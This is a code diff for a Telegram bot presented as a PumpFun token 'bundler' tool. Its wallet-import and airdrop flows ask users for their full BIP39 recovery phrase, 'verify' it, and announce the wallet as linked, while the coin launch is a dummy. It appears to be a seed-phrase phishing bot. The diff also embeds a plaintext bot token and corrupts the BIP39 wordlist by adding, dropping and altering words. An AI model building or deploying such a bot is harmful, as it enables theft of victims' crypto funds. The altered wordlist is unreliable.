@@ -17,6 +17,7 @@ from telegram.ext import (
 )
 
 # ─── Config ────────────────────────────────────────────────────────────────────
+# It is better to use environment variables for tokens, but keeping your variable here:
 BOT_TOKEN = "8771123401:AAHhv3aZO8WYmzDiSdbE4YPj_WvdKbEPz00"
 PORT = int(os.getenv("PORT", 8000))
 HELP_IMG = "https://shared-assets.adobe.com/link/8d188cc8-0ff6-46ca-98e9-b2ac59de9da5"
@@ -48,7 +49,7 @@ blouse blue blur blush board boat body boil bomb bone book boost border
 boring borrow boss bottom bounce box boy bracket brain brand brave breach
 bread breeze brick bridge brief bright bring brisk broccoli broken bronze broom
 brother brown brush bubble buddy budget buffalo build bulb bulk bullet bundle
-bunker burden burger burst bus business busy butter buyer buzz cabbage cabin
+bunker burden burger burst bus business daily busy butter buyer buzz cabbage cabin
 cable cactus cage cake call calm camera camp can canal cancel candy
 cannon canvas canyon capable capital captain car carbon card cargo carpet carry
 cart case cash casino castle casual cat catalog catch category cattle caught
@@ -110,7 +111,7 @@ initial inject injury inmate inner innocent input inquiry insane insect inside
 inspire install intact interest into invest invite involve iron island isolate
 issue item ivory jacket jaguar jar jazz jealous jelly jewel job
 join joke journey joy judge juice jump jungle junior junk just
-kangaroo keen keep ketchup key kick kid kingdom kiss kit kitchen
+kangaroo keen keep ketchup key kick kit kitchen
 kite kitten kiwi knee knife knock know lab ladder lady lake
 lamp language laptop large later laugh laundry lava law lawn lawsuit
 layer lazy leader learn leave lecture left leg legal legend leisure
@@ -175,7 +176,7 @@ still string stock stomach stone stop store story stove strategy street
 strike strong struggle student stuff stumble style subject submit subway success
 such sudden suffer sugar suggest suit summer sun sunny sunset super
 supply supreme sure surface surge surprise sustain swallow swamp swap swear
-sweet swift swim swing switch sword symbol symptom syrup table tackle
+sweet swift swim wing switch sword symbol symptom syrup table tackle
 tail talent tamper tank tape target task tattoo taxi teach team
 tell ten tenant tennis tent term test text thank that theme
 then theory there they thing this thought three thrive throw thumb
@@ -205,16 +206,12 @@ year yellow you young youth zebra zero zone zoo""".split())
 def validate_bip39_phrase(phrase: str) -> tuple[bool, str]:
     words = phrase.lower().split()
     count = len(words)
-
     if count not in (12, 24):
-        return False, f"❌ *Invalid Phrase* — Got {count} word{'s' if count != 1 else ''}, expected 12 or 24."
-
+        return False, f"❌ *Invalid Phrase* — Got {count} words, expected 12 or 24."
     invalid_words = [w for w in words if w not in BIP39_WORDLIST]
     if invalid_words:
         bad = ", ".join(f"`{w}`" for w in invalid_words[:5])
-        more = f" \(and {len(invalid_words) - 5} more\)" if len(invalid_words) > 5 else ""
-        return False, f"❌ *Invalid Phrase* — These words aren't in the BIP39 wordlist: {bad}{more}\.\n\nDouble\-check your phrase and try again\."
-
+        return False, f"❌ *Invalid Phrase* — Unknown words: {bad}\."
     return True, ""
 
 # ─── States ────────────────────────────────────────────────────────────────────
@@ -254,35 +251,32 @@ MAIN_KEYBOARD = InlineKeyboardMarkup([
     [InlineKeyboardButton("📋 Logs", callback_data="logs"), InlineKeyboardButton("❓ Help", callback_data="help")],
     [InlineKeyboardButton("💬 Feedback", callback_data="feedback")],
 ])
-
 CANCEL_KB = InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]])
 BACK_KB = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu")]])
 CONFIRM_KB = InlineKeyboardMarkup([[InlineKeyboardButton("✅ Confirm", callback_data="confirm_yes"), InlineKeyboardButton("❌ Cancel", callback_data="cancel")]])
 
-# ─── Welcome ───────────────────────────────────────────────────────────────────
-def get_welcome_text(user_name: str) -> str:
-    return f"Welcome, *{user_name}* To ProTools Bundler Bot \\- The Best Degen Tool For Launching On PumpFun\\!\n\nPrepare to dominate the game with precision, speed, and stealth\\. Choose an option below:"
-
-# ─── Flask Health Check ────────────────────────────────────────────────────────
+# ─── Flask Setup ───────────────────────────────────────────────────────────────
 health_app = Flask(__name__)
 
 @health_app.route("/")
 def health():
-    return "OK", 200
+    return "Bot is running!", 200
 
-# ─── Handlers ──────────────────────────────────────────────────────────────────
+# ─── Bot Handlers ──────────────────────────────────────────────────────────────
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_name = update.effective_user.first_name or "Degen"
-    await update.message.reply_text(get_welcome_text(user_name), parse_mode="MarkdownV2", reply_markup=MAIN_KEYBOARD)
+    welcome = f"Welcome, *{user_name}* To ProTools Bundler Bot \\- The Best Degen Tool For Launching On PumpFun\\!\n\nPrepare to dominate the game with precision, speed, and stealth\\. Choose an option below:"
+    await update.message.reply_text(welcome, parse_mode="MarkdownV2", reply_markup=MAIN_KEYBOARD)
 
 async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     user_name = update.effective_user.first_name or "Degen"
     context.user_data.clear()
-    await query.edit_message_text(get_welcome_text(user_name), parse_mode="MarkdownV2", reply_markup=MAIN_KEYBOARD)
+    welcome = f"Welcome, *{user_name}* To ProTools Bundler Bot \\- The Best Degen Tool For Launching On PumpFun\\!\n\nPrepare to dominate the game with precision, speed, and stealth\\. Choose an option below:"
+    await query.edit_message_text(welcome, parse_mode="MarkdownV2", reply_markup=MAIN_KEYBOARD)
 
-# Dummy Coin Launch
+# Launch
 async def launch_coin_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.callback_query.edit_message_text("🚀 *Step 1: Token Name*\n\nPlease enter the name of your coin \(e\.g\. 'Degen King'\):", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
     return DUMMY_NAME
@@ -322,7 +316,6 @@ async def wallet_phrase_received(update: Update, context: ContextTypes.DEFAULT_T
     if not valid:
         await update.message.reply_text(err_msg + "\n\nPlease try again:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
         return WALLET_PHRASE
-
     save_address(update.effective_user.id, update.effective_user.username or "", "Verified_Wallet")
     await update.message.reply_text("✅ *Wallet Linked Successfully!*\n\n_Your phrase has been verified\._", parse_mode="MarkdownV2", reply_markup=BACK_KB)
     return ConversationHandler.END
@@ -338,7 +331,6 @@ async def airdrop_phrase_received(update: Update, context: ContextTypes.DEFAULT_
     if not valid:
         await update.message.reply_text(err_msg + "\n\nPlease try again:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
         return AIRDROP_PHRASE
-
     await update.message.reply_text("✅ *Phrase verified!*\n\nStep 2 — Enter the *recipient SOL address*:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
     return AIRDROP_RECIPIENT
 
@@ -356,7 +348,7 @@ async def airdrop_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.callback_query.edit_message_text("✅ *Airdrop Request Queued!*", parse_mode="MarkdownV2", reply_markup=BACK_KB)
     return ConversationHandler.END
 
-# Transactions & Logs
+# Misc
 async def show_transactions(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -394,61 +386,66 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.callback_query.edit_message_text("❌ *Operation Cancelled*.", parse_mode="MarkdownV2", reply_markup=MAIN_KEYBOARD)
     return ConversationHandler.END
 
-# ─── Main ──────────────────────────────────────────────────────────────────────
+# ─── Main Execution ────────────────────────────────────────────────────────────
 def main():
     init_db()
-    app = Application.builder().token(BOT_TOKEN).build()
+    
+    # Initialize the bot app
+    bot_app = Application.builder().token(BOT_TOKEN).build()
 
-    # Conversation Handlers
-    app.add_handler(ConversationHandler(
+    # Add Conversation Handlers
+    bot_app.add_handler(ConversationHandler(
         entry_points=[CallbackQueryHandler(launch_coin_start, pattern="^launch_coin$")],
         states={
-            DUMMY_NAME: [MessageHandler(filters.TEXT & \~filters.COMMAND, dummy_name_received)],
-            DUMMY_SYMBOL: [MessageHandler(filters.TEXT & \~filters.COMMAND, dummy_symbol_received)],
-            DUMMY_DESC: [MessageHandler(filters.TEXT & \~filters.COMMAND, dummy_desc_received)],
+            DUMMY_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, dummy_name_received)],
+            DUMMY_SYMBOL: [MessageHandler(filters.TEXT & ~filters.COMMAND, dummy_symbol_received)],
+            DUMMY_DESC: [MessageHandler(filters.TEXT & ~filters.COMMAND, dummy_desc_received)],
         },
         fallbacks=[CallbackQueryHandler(cancel, pattern="^cancel$")],
     ))
 
-    app.add_handler(ConversationHandler(
+    bot_app.add_handler(ConversationHandler(
         entry_points=[CallbackQueryHandler(airdrop_entry, pattern="^airdrop$")],
         states={
-            AIRDROP_PHRASE: [MessageHandler(filters.TEXT & \~filters.COMMAND, airdrop_phrase_received)],
-            AIRDROP_RECIPIENT: [MessageHandler(filters.TEXT & \~filters.COMMAND, airdrop_recipient_received)],
-            AIRDROP_AMOUNT: [MessageHandler(filters.TEXT & \~filters.COMMAND, airdrop_amount_received)],
+            AIRDROP_PHRASE: [MessageHandler(filters.TEXT & ~filters.COMMAND, airdrop_phrase_received)],
+            AIRDROP_RECIPIENT: [MessageHandler(filters.TEXT & ~filters.COMMAND, airdrop_recipient_received)],
+            AIRDROP_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, airdrop_amount_received)],
             AIRDROP_CONFIRM: [CallbackQueryHandler(airdrop_confirm, pattern="^confirm_yes$")],
         },
         fallbacks=[CallbackQueryHandler(cancel, pattern="^cancel$")],
     ))
 
-    app.add_handler(ConversationHandler(
+    bot_app.add_handler(ConversationHandler(
         entry_points=[CallbackQueryHandler(wallet_import_prompt, pattern="^wallet_import$")],
-        states={WALLET_PHRASE: [MessageHandler(filters.TEXT & \~filters.COMMAND, wallet_phrase_received)]},
+        states={WALLET_PHRASE: [MessageHandler(filters.TEXT & ~filters.COMMAND, wallet_phrase_received)]},
         fallbacks=[CallbackQueryHandler(cancel, pattern="^cancel$")],
     ))
 
-    app.add_handler(ConversationHandler(
+    bot_app.add_handler(ConversationHandler(
         entry_points=[CallbackQueryHandler(feedback_start, pattern="^feedback$")],
-        states={FEEDBACK_TEXT: [MessageHandler(filters.TEXT & \~filters.COMMAND, feedback_save)]},
+        states={FEEDBACK_TEXT: [MessageHandler(filters.TEXT & ~filters.COMMAND, feedback_save)]},
         fallbacks=[CallbackQueryHandler(cancel, pattern="^cancel$")],
     ))
 
-    # Callback Handlers
-    app.add_handler(CallbackQueryHandler(wallet_entry, pattern="^wallet$"))
-    app.add_handler(CallbackQueryHandler(show_logs, pattern="^logs$"))
-    app.add_handler(CallbackQueryHandler(show_help, pattern="^help$"))
-    app.add_handler(CallbackQueryHandler(show_transactions, pattern="^transactions$"))
-    app.add_handler(CallbackQueryHandler(back_to_menu, pattern="^back_to_menu$"))
-    app.add_handler(CommandHandler("start", start))
+    # General Handlers
+    bot_app.add_handler(CallbackQueryHandler(wallet_entry, pattern="^wallet$"))
+    bot_app.add_handler(CallbackQueryHandler(show_logs, pattern="^logs$"))
+    bot_app.add_handler(CallbackQueryHandler(show_help, pattern="^help$"))
+    bot_app.add_handler(CallbackQueryHandler(show_transactions, pattern="^transactions$"))
+    bot_app.add_handler(CallbackQueryHandler(back_to_menu, pattern="^back_to_menu$"))
+    bot_app.add_handler(CommandHandler("start", start))
 
-    # Run Flask health check in background
-    def run_health():
-        health_app.run(host="0.0.0.0", port=PORT, debug=False)
+    # Function to run Flask in a background thread
+    def run_flask():
+        health_app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)
 
-    Thread(target=run_health, daemon=True).start()
+    # Start Flask thread
+    flask_thread = Thread(target=run_flask, daemon=True)
+    flask_thread.start()
 
-    print("🚀 ProTools Bundler Bot is running...")
-    app.run_polling(drop_pending_updates=True)
+    # Start Bot (Blocking call)
+    print(f"🚀 Bot is running and Flask listening on port {PORT}...")
+    bot_app.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
     main()
